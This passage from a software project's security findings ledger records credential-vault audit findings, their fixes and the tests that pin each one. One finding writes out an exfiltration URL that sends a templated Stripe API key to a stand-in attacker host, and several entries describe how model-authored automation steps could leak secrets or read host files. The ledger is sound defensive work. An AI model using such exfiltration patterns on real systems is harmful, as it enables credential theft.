  VALUES in `scripts/gitleaks.toml` — deliberately not by path: an
  `api/tests/security/**` path allowlist is one line instead of five and would blind the scanner to
  a real token pasted into a test file, which is a normal way credentials escape. Renaming the
  fixtures was not an option: `gitleaks detect` scans git HISTORY, so the original literal stays
  reachable in the commit that introduced it. Going forward a new fixture should carry
  `EKOA-SYNTHETIC-`, covered generically. Verified precise: a real-looking `sk-live-...` in the same
  directory still fails the scan.
- **`bridge-ingress-freetext-header-residual`** (OPEN by design 2026-07-29, LOW, confidentiality —
  found while building H-4). The ingress filter has two legs: value-keyed (exact, for values Cortex
  delivered) and name-pattern (`redactBodyByName`, for credentials Cortex never held). The name leg
  understands JSON keys and `key=value` pairs. A colon-separated header line in free-text stdout —
  `Authorization: Bearer sk-live-...` — matches neither shape and survives it, so such a value is
  removed only when Cortex DELIVERED it and the value leg recognises it. NOT closed, deliberately:
  widening the name leg to colon-separated pairs would fire on ordinary prose, including any
  `word: value` line in a document excerpt, and a filter that mangles legitimate output is one
  people route around. Pinned in BOTH directions by
  `api/tests/security/bridge-ingress-redaction.test.ts` (the leak asserted as surviving, and the
  delivered-value mitigation asserted as working), so if it is ever closed the expectation flips
  and the test says so rather than the behaviour drifting silently.
- **`ci-typecheck-never-ran`** (FIXED 2026-07-28, HIGH, process — found while fixing the red
  typecheck baseline for A-8). **The per-PR CI lane has never successfully typechecked `api/` or
  `web/`.** `.github/workflows/ci.yml` ran `npm run typecheck` with no prior build of `shared`, but
  `api/` and `web/` resolve `@ekoa/shared` through its package `types` field
  (`shared/dist/index.d.ts`), which is gitignored and only exists after `npm run build --workspace
  shared`. On a fresh `npm ci` checkout the step therefore died with **87 x TS2307 "Cannot find
  module '@ekoa/shared'"** — reproduced locally by moving `shared/dist` aside — so the step failed
  for a MISSING ARTIFACT, never reaching a single real type error. A local tree hides it completely,
  because `shared/dist` survives from an earlier build. Two consequences, and the second is the
  reason this is HIGH rather than a chore: (1) `ci` has been red on `main` for at least the last
  eight runs and the redness carried no information, which is how a lane stops being read; (2) real
  type errors accumulated on `main` unnoticed — 9 of them at the time of writing, listed below —
  because nothing anywhere was checking. FIXED by building `shared` before the typecheck step.
  Verification is the next CI run on push; the local equivalent (`rm -rf shared/dist && npm run
  build --workspace shared && npm run typecheck`) is green.
- **`main-typecheck-red-9-errors`** (FIXED 2026-07-28, MEDIUM, correctness — the errors
  `ci-typecheck-never-ran` was hiding). Nine `tsc` errors on clean `main` at `619277b`, all landed
  by recent Cofre work: (a) `scripts/migrate/ciphertext-v2.ts` imported a non-existent export — see
  `k4-migration-dead-on-arrival`, which is the more serious half; (b) `tests/bridge/revoke.test.ts`
  (x2) and `tests/fake-daemon/correlation-join.test.ts` passed a `DelegationActor` without the
  `orgId` that E-1 made REQUIRED — `integration.test.ts` was updated in that change and these two
  were missed; (c) `tests/security/page-value-leaks.test.ts` (x3) built css locators as
  `{strategy:'css', value}` where the `Locator` union requires `{strategy:'css', selector}`, so
  `describeLocator` read `undefined` and the cache content under test was `css="undefined"` — the
  assertions passed while never exercising a well-formed locator, so this was a green test proving
  less than it claimed (now also asserts the selector IS retained, since shape is what the summary
  is allowed to keep); (d) `tests/security/screenshot-masking.test.ts` (x2) indexed
  `mock.calls[0][0]` on a zero-arg `vi.fn`, whose recorded tuple type is `[]` — the `as {...}` cast
  was papering over an argument the mock's type said could not exist. All fixed; `npm run
  typecheck` is green across the three workspaces and `npm test` is 130 shared / 2555 api / 359 web.
- **`shared-suite-counted-twice`** (FIXED 2026-07-28, MEDIUM, test-integrity — found while
  verifying the `ci-typecheck-never-ran` fix). The `shared` suite collected every test TWICE — once
  from `src/`, once from the compiled `dist/` copy — so its reported size was a function of a BUILD
  ARTIFACT, not of the tests. Observed in one sitting: **5 files/130 tests** on a stale dist,
  **6/144** after a rebuild, **3/72** on a clean checkout. The true count is 3 files / 72 tests, so
  every "shared 130" in the recent commit messages was inflated by a factor of ~1.8 and the number
  moved whenever someone happened to build. Two causes, both fixed: `shared/tsconfig.json` compiled
  `src/**/*.test.ts` into the published `dist/` (tests were shipped to consumers as well as
  double-collected) — now excluded; and `shared` had no vitest config, while **Vitest 4 narrowed
  its default `exclude` to `node_modules` and `.git` only**, dropping the dist glob that older
  versions excluded — now `shared/vitest.config.ts` pins `include: src/**/*.test.ts` and restores
  the dist exclusion. `api/` and `web/` were never affected: their builds emit no test files.
  Verified stable at 3/72 across a clean build, a rebuild and a full-lane run. Worth noting for
  anyone auditing the ledger: a census that quotes counts is only as trustworthy as the collection
  behind it, and this one silently changed under a minor-version default.
- **`k4-migration-dead-on-arrival`** (FIXED 2026-07-29, MEDIUM, correctness/governance — found by
  the A-8 typecheck sweep). `api/scripts/migrate/ciphertext-v2.ts` is journaled as landed (commit
  `f993d06`, `docs/decisions.md` 2026-07-28 K-4) but **had never compiled and has never run**. It
  imported `cofreItems` from `src/data/stores.js`, which does not export it — the Cofre item store
  lives in `src/cofre/store.ts`, which exports `__cofreItemsStoreForMigration` for exactly this
  caller. FIXED here only to the extent the red baseline demanded: the import is corrected and the
  file now typechecks. Still OPEN, and this is the part that matters — the migration is **not
  wired and not proven**: (a) nothing registers it in `api/scripts/migrate/cli.ts`, so there is no
  way to invoke it; (b) the `gate:crypto-version` script the decision entry names does not exist in
  `package.json`; (c) it has no test, so `module_tests` never covered it. The consequence is that
  the v1 weakness the entry claims K-4 removes — a v1 row is under the flat global key and decrypts
  under ANY tenant argument — is still fully present in any deployed database, and the journal says
  otherwise. Close by wiring the CLI entry, adding the gate script, and adding a hermetic test that
  seeds v1 rows, migrates, and asserts `noV1CiphertextRemains()`. Note while doing so that
  `noV1CiphertextRemains()` currently CALLS `migrateCiphertextToV2()`, so the "check" mutates the
  database — safe because the migration is idempotent, but a gate that writes is the wrong shape
  and should be split into a read-only scan. **CLOSED 2026-07-29**: scan and migrate are now
  separate (`scanCiphertextVersions()` is read-only, so the post-cutover gate can be pointed at
  production to ask a question); `api/scripts/migrate/ciphertext-v2-cli.ts` is the entry point,
  dry-run by default with `--execute` required to write (ch10 §10.3 rule 3); `migrate:ciphertext-v2`
  and `gate:crypto-version` are wired in `api/package.json`, the latter exiting non-zero while any
  v1 row remains so it can gate CI after the cutover window. Proven by
  `api/tests/security/ciphertext-v2-migration.test.ts` (9 cases, both plants red) AND by driving the
  real CLI against an ephemeral mongo: gate exit 1 with a seeded v1 row -> `--execute` reports
  COMPLETE -> gate exit 0. The decisive test is not "the row changed shape" but "the row can no
  longer be decrypted under the WRONG tenant", which is the property K-1 only gave to new writes.
- **`cofre-raw-store-lint-rule-missing`** (FIXED 2026-07-29, LOW, defence-in-depth — found by the
  A-8 sweep). Plan item B-1 specified "an eslint rule forbidding any import of the raw `cofre_items`
  store handle outside `api/src/cofre/`, and forbidding re-derivation of the scoping predicate".
  No such rule exists in `.eslintrc.cjs` — the module-direction zone array lists `./api/src/cofre`
  only as a TARGET that may not import `routes/`/`server.ts`. So the scoped-repository chokepoint
  that makes the Cofre the third `OwnerVisibilityScoped` consumer rests on convention alone, and
  `__cofreItemsStoreForMigration` (a deliberately ugly name, now imported by the migration script)
  is greppable but not enforced. Not exploitable today — the only importer is the migration — but
  the whole point of B-1's chokepoint is that it cannot be bypassed by a future caller who has not
  read the plan. FIXED: `.eslintrc.cjs` bans `**/cofre/store` outside `api/src/cofre/**`, with
  `api/scripts/migrate/**` legitimately outside the rule's file set (a migration rewrites every
  tenant's rows and so cannot go through an owner-scoped repository). Worth recording HOW it was
  nearly got wrong: the first attempt added a second `no-restricted-imports` override for
  `api/src/**`, and because ESLint REPLACES rather than merges that rule per file, it silently wiped
  the `@anthropic-ai` egress ban (FIXED-3/8/13) for every non-llm file while appearing to add a
  rule — a lint config that looked stricter and was materially weaker. Both bans now live in one
  override per file set, and the llm/ and cofre/ exemptions RESTATE the ban they keep instead of
  switching the rule off. All four directions verified against planted imports.
- **`page-values-to-log-and-memory`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery
  gate R-4 + R-5). Two leaks of the same class: values read off a LIVE PAGE of an authenticated
  session. (R-4) `automation/engine.ts` merged verifier-extracted values into the shared `inputs`
  map and logged them with `console.log(\`... ${k}="${v}" ...\`)` — cleartext in the process log,
  and from `inputs` they are template-substituted into downstream `api_call` URLs/headers/bodies
  whose RESOLVED form is persisted. FIXED: the log records the key and the LENGTH only, and a
  secret-shaped KEY NAME (otp/token/password/senha/sessao/credential/pin/cvv, PT-PT included) is
  refused outright so the value never joins `inputs` at all. The vocabulary is pinned in BOTH
  directions — a false positive silently refuses an ordinary input, and a bare `/auth/` matched
  `author`. (R-5) `automation/cache.ts` wrote the resolved action into ORGANIZATIONAL MEMORY at
  tier `active` through the ordinary `createMemory` surface, and `memory/resolver.ts` `isInjectable`
  excluded only `tier==='archive'` — so those rows were term-scored against the user's ordinary
  chat prompt and injected under `# Memória`. `summariseAction` put the first 40 chars of any
  `fill`, the FULL `navigate` URL and the FULL `select` value into the scored `content`, so a
  magic-link or SSO-callback URL was replayed verbatim to the chat model on term overlap. FIXED by
  a `nonMemorable` memory class that `isInjectable` now requires to be absent (structurally "not a
  memory", distinct from `tier:'archive'` which is merely user-hidden), set on every action- and
  assertion-cache row; plus de-valuing the summaries at the source — length for a `fill`, origin +
  pathname for a `navigate` (the query string is where the tokens live), no literal for a `select`
  or an assertion. The cache still works: the exact action lives structurally in `cachePayload`,
  which was never term-scored. Pinned by `api/tests/security/page-value-leaks.test.ts` (44 cases).
- **`screenshot-plane-unauthenticated`** (FIXED 2026-07-27, HIGH, confidentiality + GDPR — Cofre
  discovery gate R-3). `/automation-screenshots` was an `express.static` mount over
  `<dataDir>/automation-runs` with NO auth middleware, NO tenant check and NO expiry. The recorded
  rationale (`docs/decisions.md`, 2026-07-11) was that an `<img>` cannot carry an Authorization
  header, so "the unguessable automationId/runId path IS the capability". Two problems: the PNGs
  are screenshots of an AUTHENTICATED session on a client portal (for this product, processo
  numbers and client NIFs rendered as pixels), and the run id is not treated as a secret anywhere
  else — it travels in SSE frames, persisted step records, the run API and logs. FIXED without
  trading the control away, using the pattern the repo already applies to the SSE stream for the
  identical constraint: a short-lived platform JWT in the query string (`verifySseToken`), then a
  run lookup that checks org and ownership before a byte is streamed. Cross-tenant reads answer
  404, not 403, so existence is not an oracle; an unattributable legacy run (no `orgId`) is refused
  rather than served; path segments go through the containment resolver; non-PNG files are refused.
  The URL SHAPE is unchanged, so every persisted `screenshotUrl` keeps resolving — the web client
  appends `?token=` via the existing `withPreviewToken` helper. RETENTION: nothing ever deleted
  these PNGs (every reference in `api/src` was a write or a path builder), a GDPR erasure gap over
  an unindexed tree, so a 7-day sweeper and a `deleteRunScreenshots` erasure path land in the same
  change. Pinned by `api/tests/security/screenshot-plane.test.ts` (14 cases, including a
  traversal-escape test on the erasure path) and a REWRITTEN
  `api/tests/contract/automation-screenshots.test.ts`, which previously asserted the unauthenticated
  read as the contract.
- **`d8-oauth-custody-plane`** (AUDIT COMPLETE 2026-07-27 — the audit no discovery-gate pass
  covered). The live OAuth credential-custody plane holds refresh tokens TODAY and had received no
  verdict from any of D1-D7. Audited: `integrations/platform-oauth.ts`, `m365-proxy.ts`,
  `prefetch.ts`, `app-sso-sessions.ts`, `pipedream.ts`.

  **CONFORMS, and should be reused rather than replaced.** `platform-oauth.ts` encrypts the token
  bundle at rest through the one crypto module, refreshes on expiry and re-persists, and — the part
  worth calling out — uses a SINGLEFLIGHT per row so a rotating `refresh_token` can never be
  double-spent by a lazy refresh racing a sweep. That is a genuinely hard property and it is already
  correct. External I/O defaults to the SSRF-guarded fetcher. `connect` logs `{provider}` only.
  `m365-proxy.ts` is the CLOSEST SHIPPED ANALOGUE OF THE I9 PRIMITIVE: it forwards the Graph path
  verbatim while injecting a freshly-refreshed Bearer server-side, so the served artifact never sees
  the token — exactly the "caller names a reference, a fixed primitive executes" shape the Cofre
  needs, and WS-J should model on it. `pipedream.ts` keeps project keys in one org-scoped encrypted
  row, decrypted just-in-time and never logged/thrown/returned, behind a master toggle and a billing
  gate. `app-sso-sessions.ts` enforces artifact isolation server-side (`session.appId === canonical
  id`, never by cookie path) and its pending-auth consume is atomic (`findOneAndDelete`), so the
  no-replay property is LOCAL rather than relying on the IdP.

  **DIVERGES — the gaps that matter for the Cofre.** (1) The whole plane is a PARALLEL custody
  path: it never routes through `cofre/unwrap()`, so none of it has a grant, a lock, per-item origin
  binding, or an "item used" Registo event. A user cannot see or revoke these credentials from the
  Cofre, and "Bloquear tudo" does not touch them. (2) It uses the UNSCOPED `encrypt()`, so ciphertext
  is not org-bound — the same finding already recorded against integration credentials, under the
  same single global `ENCRYPTION_KEY`. (3) `prefetch.ts` injects OAuth-fetched email/calendar/file
  CONTENT into the chat SYSTEM PROMPT (`agents/context.ts:170`), cached per org for 60s. That is
  model-bound text and therefore IS covered by the anonymisation chokepoint (`client.ts:967-968`
  anonymises `systemPrompt` as well as `prompt`) — so I1 holds, with the honest residual that the
  coverage is only as good as the deny-list and the PT recognizers. Worth stating explicitly because
  the gate never verdicted it and a reader could reasonably have assumed otherwise.

  **CONSEQUENCE FOR B-4.** The migration should bring these rows under `unwrap()` — gaining grants,
  lock-now/lock-all and the Registo events — WITHOUT rewriting the refresh machinery, whose
  singleflight is the part that is hard to get right. `oauth_token` is already a Cofre item type.
- **`canvas-token-is-a-platform-token`** (FIXED 2026-07-27, HIGH, authentication — Cofre F-1, the
  `api/src/streaming/` security pass). The canvas (screencast) token is signed with the SAME secret
  as platform session tokens and carried NO class marker: `sub` + `jti`, no `aud`. `auth/jwt.ts`'s
  token-class guard only knew about `ekoa-bridge`, so `verifyToken` ACCEPTED a canvas token and
  returned claims with a valid `sub`/`jti` and `role`/`orgId` undefined. `requireAuth` then passed
  it end-to-end: the jti exists, it is not revoked, `getActivation(sub)` resolves for a real user,
  and `iat` is fresh. VERIFIED EMPIRICALLY with a throwaway probe before being written up, not
  inferred from a read. The consequence is not theoretical — every route that authorizes on
  `req.user.sub` ALONE never reads `role` or `orgId`, so a leaked 600-second canvas token was a
  platform bearer token for gateway-key MINT (which returns a long-lived API key), the bridge token
  endpoint, and the Cofre item routes. FIXED with the same mechanism the bridge token already used:
  `aud: 'ekoa-canvas'` minted and required on the media channel, and refused by the platform
  verifier. The guard checks `traceId` as well as `aud`, so a token minted before the audience
  landed gets no grandfathered window. Pinned by `api/tests/security/canvas-token-class.test.ts`
  (8 cases, including a validly-signed pre-audience token that exercises the traceId branch rather
  than merely failing a signature check).
- **`streaming-screencast-has-no-credential-suppression`** (OPEN, HIGH, confidentiality — Cofre F-1;
  BLOCKS F-2 and D-5). The CDP screencast in `api/src/streaming/session.ts` is a continuous JPEG
  stream of the LIVE page, and it is a SEPARATE path from the automation screenshot that H-2/H-3
  masks. `Page.startScreencast` has no mask option — Playwright's `mask` is a `screenshot()` feature
  only — so masking is not available here and SUPPRESSION is the only correct control: the
  screencast must be stopped for the duration of a typist credential window, and the typist must
  refuse to run at all if it cannot confirm the screencast is stopped. Until that lands, WS-F's
  typist must not fill a credential while a canvas session is attached. This is the specific reason
  the plan blocks F-2 on F-1, and it is now a named finding rather than a scheduling note.
- **`browser-context-leak-and-docblock-drift`** (FIXED 2026-07-27, MEDIUM, resource + accuracy —
  Cofre discovery gate G-3). `LocalBrowserSession.dispose()` closed only the PAGE, so every run
  leaked its browser context — and with it the entire cookie jar of an authenticated session — for
  the lifetime of the process. FIXED by retaining the context and closing it in `dispose()`, both
  closes best-effort so teardown never fails a completed run. SEPARATELY, the module's docblock and
  `ensurePage`'s comment described "the owner's PERSISTENT context" with concurrent runs for one
  owner sharing cookies; the composition root has always handed back `browser.newContext()`,
  ignoring the owner entirely. The divergence is safe in the direction that matters — a fresh
  isolated context per session means no cookie jar is reused across runs OR owners, which is
  stricter than the documented model — but reading the docblock instead of the composition root
  produced wrong conclusions twice during the discovery gate. The comments now describe the code as
  built, and the behaviour is pinned by test rather than asserted by comment. Pinned by
  `api/tests/security/browser-context-lifecycle.test.ts` (5 cases).
- **`planner-and-assertion-echo-page-content`** (FIXED 2026-07-27, MEDIUM, confidentiality — Cofre
  discovery gate H-6 + the H-1 assertion leg). Two messages carried content into three destinations
  each: the process log, the RETRY PROMPT sent back to the model, and the persisted record / SSE
  stream rendered to the user. (H-6) `automation/planner.ts` built a 50-character preview of an
  auth-shaped header's VALUE and interpolated it into a cross-validation violation — and the thing
  being reported is by definition a literal credential the model just wrote, so the check designed
  to stop raw tokens in headers was itself copying them into all three sinks. The sibling argv check
  echoed the whole offending argv element. Both now report a CATEGORY: the header NAME, or the argv
  POSITION. (H-1 assertion leg) `automation/executor.ts` `expect_text` echoed 200 raw characters of
  `innerText` from a page of an AUTHENTICATED session, `expect_url` echoed the full URL including
  the query string where magic-link tokens and SSO codes live, and `expect_title` echoed the title
  whole. These are the ONE live in-process DOM-text path the gate identified as reaching the
  rehearsal fixer's prompt. Now: the expectation plus a character COUNT, origin + pathname, and a
  bounded title. Pinned in `api/tests/security/credential-boundaries.test.ts`.
  NOT YET DONE, and explicitly still open: the rest of H-1 — `local_command` stdout/stderr,
  `ekoa_action` results and `extractActionRunOutput` still need the run-scoped `SecretRegistry`
  threaded through the engine, which is a structural change rather than a message fix.
- **`anonymisation-skips-the-pixel-plane`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre
  discovery gate H-2). `api/src/llm/client.ts` anonymises `prompt` and `systemPrompt` at the egress
  chokepoint (`:967-968`) and forwards `images: opts.images` VERBATIM (`:981`) — and
  `api/tests/llm/client.test.ts` PINNED that forwarding as the contract, so the gap read as
  intended behaviour. `docs/security.md` described the pipeline as covering "all model-bound text",
  which is true and false-by-omission at once: a reader took it as covering everything model-bound.
  For this product the pixels are screenshots of an AUTHENTICATED session on a court portal —
  processo numbers, client NIFs, and during a login step the credential itself. FIXED BROWSER-SIDE,
  because a Cortex-side transform on a finished PNG is OCR-and-hope: `automation/screenshot-masking.ts`
  masks credential-bearing regions by LOCATOR at capture time (so the sensitive pixels are never
  rendered into the buffer) with a SOLID mask colour, and `LocalBrowserSession` gains
  `withCaptureSuppressed()` so a credential window takes NO picture at all — a stronger guarantee
  than masking the field. The failure mode is the decisive property: a masking failure returns null,
  which the existing capture path already treats as "no screenshot this step", so it can never
  degrade to an unmasked capture. The pinning test is re-framed in place as plumbing-only and
  `docs/security.md` now states the text/pixel split, including the RESIDUAL: a screenshot still
  carries non-credential page content as untokenized pixels. Pinned by
  `api/tests/security/screenshot-masking.test.ts` (12 cases).
- **`envwhitelist-reads-cortex-env`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery
  gate D4/J-4). `LocalCommandSpec.envWhitelist` was a list of environment variable NAMES accepted
  from the planner (a model) which `buildEnv` resolved against the CORTEX API SERVER's OWN
  `process.env` — provider keys, `ENCRYPTION_KEY`, `JWT_SECRET`, database credentials — and shipped
  the resolved values to a user's machine. A model-authored `envWhitelist: ["JWT_SECRET"]` was a
  complete platform compromise expressed as an ordinary step field. It never had a receiver
  (`ekoa-bridge`'s bash tool hard-scrubs the child to seven names) and `local_command` is unreachable
  end-to-end, so it was latent rather than live — but it would have gone live the moment
  `setDaemonConnectionResolver` was wired. DELETED rather than hardened, in the same change that
  adds the real primitive (`api/src/cofre/process-injection.ts`), because deletion cost nothing then
  and becomes impossible later. Pinned by `api/tests/security/i9-env-injection.test.ts` (29 cases),
  which includes a STATIC GUARD asserting the declaration and both use sites are gone.
- **`cofre-absent`** (IN PROGRESS 2026-07-27, the Cofre build itself — Cofre WS-A/WS-B/WS-C). The
  discovery gate found NO Cofre: no credential item model, no grants, no policy-lock seam, no origin
  binding as a property of a credential, no relay typing, no session store. LANDED SO FAR: the
  `shared/src/cofre.ts` vocabulary with I7 and I8 encoded as SCHEMA (a `certificate_identity` cannot
  hold a TTL grant; a signature relay cannot be constructed without a document name + hash), and
  `api/src/cofre/` with the single `unwrap()` seam — fail-closed on tenancy, an active grant, origin
  binding and existence, all checked before anything decrypts. Owner-scoped, ciphertext-only at rest,
  lock-now / lock-all, and an item view with no value field. Pinned by
  `api/tests/security/cofre-policy-lock.test.ts` (28) and `shared/src/cofre.test.ts` (28).
  STILL OPEN, in plan order: the routes and the product surfaces (WS-D, which must EXTEND the shipped
  `/settings/privacy` grants+ledger area rather than create a parallel one), the typist (WS-F, blocked
  on the `api/src/streaming/` security pass F-1), session-first storage (WS-G), the redaction pipeline's
  remaining legs (WS-H, incl. the image-plane bypass at `llm/client.ts:981` that a TEST currently pins),
  egress selection (WS-I), bridge protocol v2 + the I9 primitive (WS-J), and the KMS envelope (WS-K).
  A D8 audit of the live OAuth credential-custody plane is owed BEFORE the item model is considered
  fixed — `platform-oauth.ts`, `m365-proxy.ts`, `prefetch.ts`, `app-sso-sessions.ts` and
  `pipedream.ts` hold refresh tokens today and no audit issued a verdict on any of them.
- **`bridge-jwt-key-monoculture`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery gate
  R-8). `api/src/bridge/signing.ts` keyed the DelegatedTask HMAC with `loadConfig().jwtSecret` — the
  platform-wide secret that signs every user's session token — while `ekoa-bridge` stores
  `signingSecret` in a plaintext `config.json` (0600) on every paired laptop. Making delegation WORK
  therefore required placing the key behind every session in the deployment on every user's machine,
  so one compromised laptop compromised every session. Worse, NOTHING on the daemon side ever WROTE
  `signingSecret` (`pair.ts:72` only carried an existing value forward; `serve.ts:84` fell back to
  `''`), so in practice the delegated path was unusable without an operator hand-copying
  `JWT_SECRET` — the daemon's verifier refuses an empty key, so it denied every task: fail-closed,
  but for an invisible reason. FIXED by minting a PER-PAIRING secret in `registerPairing`, encrypted
  at rest, preserved across a redial (rotating would silently break a daemon holding the old one)
  and delivered to the owner on the already-authenticated `/bridge/token` exchange. `signDelegatedTask`
  / `verifyDelegatedTaskSig` take the secret as a parameter and refuse an empty one loudly — which
  also CONVERGES this signer with `ekoa-bridge/src/wire/signing.ts`, whose vendored copy parameterised
  the secret and added that guard back in 2026-07-10. A pairing with no secret is REFUSED (`denied`),
  never a fallback. Pinned by `api/tests/security/bridge-key-split.test.ts` (11 cases).
- **`bridge-revoke-unreachable`** (FIXED 2026-07-27, MEDIUM, availability of the kill switch — Cofre
  discovery gate R-9). `revokePairing` (`api/src/bridge/registry.ts:203`) implements terminal
  revocation with a tombstone that survives a redial and closes the live socket — and had NO
  production caller. It was reachable only from `api/tests/*`; the daemon's own `unpair` is
  local-only. A compromised machine could not be cut off except by deactivating the whole account.
  FIXED by mounting `DELETE /api/v1/bridge/pairings/:pairingId` (owner or org-admin — a compromised
  machine is exactly when the org's admin may need to act without the owner), answering 404 rather
  than 403 outside the caller's scope so the route is not an existence oracle, and emitting a
  metadata-only `security::bridge_pairing_revoked` Registo row.
- **`bridge-delegation-org-adopted`** (FIXED 2026-07-27, MEDIUM, tenant isolation — Cofre discovery
  gate E-1). `delegateToLocal` called `getConn(actor.userId)` with NO `expectedOrg`, and
  `DelegationActor` had no `orgId` field, so the task's org was ADOPTED from whatever connection
  resolved rather than checked. Org binding was structural on the connect and provider paths and
  adopted-not-checked on the one dispatch path that mints a SIGNED task. FIXED by carrying `orgId`
  on `DelegationActor` (bound from the run's actor, never a request body) and passing it as
  `expectedOrg`, so a pairing in another org reads as no pairing.
- **`bridge-excerpts-no-denylist`** (FIXED 2026-07-27 in `ekoa-bridge`, MEDIUM, confidentiality —
  Cofre discovery gate H-7). `ekoa-bridge/src/containment/resolver.ts` enforced only that the
  realpath stays inside a granted root. Containment answers "may the daemon touch this location";
  it cannot answer "should these BYTES cross Boundary 1", and they do — `engine.ts` `compose()`
  concatenates file excerpts verbatim into the provider_request body (its own comment: "The
  excerpts cross Boundary 1 here"). A user who granted a project directory containing `.env` or
  `.ssh/` had not consented to shipping their keys to a model. FIXED with a credential-bearing
  denylist applied to the REAL path, kept byte-identical to
  `api/src/security/path-containment.ts`; the two copies should be shared through the release
  artifact rather than by hand. Defence in depth only — containment remains the control.
- **`bridge-ledger-records-secrets`** (FIXED 2026-07-27 in `ekoa-bridge`, MEDIUM, confidentiality —
  Cofre discovery gate H-5). `AutomationLedgerRow.detail` was "the full bash command line, or the
  browser navigation target — recorded in full" per ADR-002, on an append-only, fsynced ledger that
  is forwarded to Cortex as trust-chip metadata. A secret passed as an argv literal
  (`curl -H "Authorization: Bearer …"`) or a one-time code in a URL was written to disk in
  cleartext, permanently, on the user's own machine — by the same component that must hold
  delivered secrets RAM-only. The audit requirement is "which invocation happened, and can I
  correlate two of them", not "what were the argument values", so rows now carry a SHAPE (program
  name + argument count, or origin+pathname) plus `detailHash`, a stable non-reversible correlation
  id. `detailHash` is optional in the schema so pre-H-5 ledger lines still parse instead of reading
  as corrupt. Two existing tier2 assertions pinned the verbatim detail and were updated.
- **`credential-origin-unbound`** (FIXED 2026-07-27, CRITICAL, confidentiality — Cofre discovery
  gate R-2). Credential use had NO origin binding on either HTTP path, and the path where the MODEL
  authored the destination had the WEAKER egress control. `automation/executors/api-call.ts`
  interpolated the decrypted fields of a model-supplied `authIntegrationKey` into a model-supplied
  URL behind only `guardedFetch`'s SSRF check — which by design permits every PUBLIC host — so
  `url: "https://attacker.example/?k={{integration.stripe.api_key}}"` exfiltrated a live tenant
  secret in one hop, and `rehearsal.ts` let the mid-run fixer author both fields.
  `integrations/action-executor.ts` was worse: a bare `globalThis.fetch` behind a `^https?://`
  shape check on a baseUrl written verbatim from an LLM-authored package config, with no SSRF guard
  at all. FIXED by `api/src/security/origin-binding.ts`: `credentialedFetch` /
  `assertOriginAllowed` make `allowedOrigins` a REQUIRED option and refuse an empty list, so
  "we could not determine the binding" and "any host is fine" can never share a code path. Matching
  is exact-host or parent-domain, never a suffix string (`evil-stripe.com` does not satisfy a
  binding to `stripe.com`). The api_call executor checks AFTER interpolation and BEFORE the
  request, so a refused destination never sees the credential; the refusal does not echo the
  attacker-chosen URL into the persisted record. The interim binding is derived from the
  integration's own declared base URLs via a fail-closed seam
  (`setIntegrationOriginResolver`); Cofre per-item `boundOrigins` replaces the derivation in WS-C
  without moving the enforcement point. `action-executor.ts` now also goes through `guardedFetch`.
  Pinned by `api/tests/security/origin-binding.test.ts` (20 cases) and
  `api/tests/security/api-call-origin-binding.test.ts` (8 cases through the real executor).
- **`integration-package-baseurl-unreviewed`** (OPEN, HIGH, confidentiality — raised while fixing
  R-2). A user-defined integration package's `httpConfig.baseUrl` is written VERBATIM from an
  LLM-authored `config.json` (`routes/integration-builder.ts:210` →
  `integrations/definitions.ts` `writeRuntimePackage`), and the owner's decrypted credential is
  injected into requests against it. R-2 put that path behind the SSRF guard, which stops it
  reaching internal infrastructure, but origin binding CANNOT fix it: the allowlist for a package
  is derived from the package's own declared host, so binding it to itself is tautological. A
  package that declares `baseUrl: https://attacker.example` is therefore still able to receive the
  credential it is configured with. This is a PROVENANCE problem — the fix is an approval gate on
  the declared host when a package is created or edited (and, later, the Cofre grant ceremony
  naming the host the user is consenting to). Deliberately not closed inside R-2 because it needs a
  user-facing approval surface, not a filter.
  NARROWED (not closed) 2026-08-03 by slice D3. `achieve`'s author arm can no longer be the way a
  new host enters the allow-list: the credential's egress binding is resolved BEFORE the draft
  exists and the draft's host must already be inside it, so on the declared-origin branch the
  allowed set is a PRE-IMAGE that cannot grow to fit (`authored-action.ts` check 5, plus check 8
  re-asserting it against the interpolated URL; the security suite measures the granted origins
  before and after a successful author and asserts they are identical). What remains OPEN is
  exactly what this entry names: the BUILDER SAVE path. A human at `PUT /api/v1/integration-builder/package`
  can still declare any `baseUrl` they like, because that route requires a human session and the
  fix is still an approval ceremony on the declared host, not a filter. So D3 closes the
  key-reachable half and changes nothing about the human half.
- **`ekoa-action-unsandboxed-fs`** (FIXED 2026-07-27, CRITICAL, confidentiality + integrity — Cofre
  discovery gate R-1). `resolveUserPath` in `api/src/automation/platform-primitives.ts` applied no
  containment whatsoever — `if (isAbsolute(path)) return path;`, with the comment "trust user-issued
  paths via Ekoa actions, since manifests are authored by the coding agent under our control". That
  premise is false in both directions: the recipe is MODEL-authored (I5) and `rehearsal.ts` lets the
  mid-run fixer LLM choose which capability runs. `file.read` of any absolute path put the bytes in
  `ctx.captured`, which is persisted as `capturedValues` and returned by `extractActionRunOutput`
  into the calling agent's tool result (I1/I2/I4); `file.write` was equally unrestricted. Because
  `ekoa_action` executes CLOUD-side with no daemon dependency, this ran on the API host today.
  FIXED by `api/src/security/path-containment.ts` — a copy-with-review of the daemon's ADR-001
  resolver (real-path checked, symlink-escape proof, write-safe for not-yet-created leaves) — rooted
  at a per-owner `<dataDir>/action-workspace/<orgId>/<userId>`, plus a credential-bearing denylist
  applied to the REAL path so a benign label cannot launder `~/.ssh/id_rsa`. `~` now means the
  workspace root, not the host home directory. An absolute host path is REFUSED rather than
  silently reinterpreted as root-relative (that reinterpretation was a first-cut defect of this fix,
  caught by its own test: it turned a containment breach into a confusing ENOENT).
  Pinned by `api/tests/security/action-path-containment.test.ts` (32 cases) and
  `api/tests/security/action-file-primitives.test.ts` (11 cases, through `executeRecipe`).
- **`redaction-masker-leak`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery gate R-6).
  Two divergent private copies of the value-keyed masker existed, each leaking in a different way,
  and BOTH silently skipped any secret shorter than four characters — the failure mode a masker must
  never have, because a value that is quietly not masked reads exactly like one that was.
  `integrations/http-template.ts`'s `maskValue` emitted `***…1234`, a persisted plaintext SUFFIX of
  every credential the platform ever proxied; `automation/executors/api-call.ts` masked to
  `<redacted>` with no leak but matched only the RAW literal, so a URL-encoded, base64 or
  JSON-escaped occurrence walked straight into the persisted step record. FIXED by
  `api/src/security/redaction.ts`: a run-scoped `SecretRegistry` substituting `[REDACTED:<handle>]`
  (no plaintext fragment, no length hint) across raw / URL-encoded / base64 / base64url /
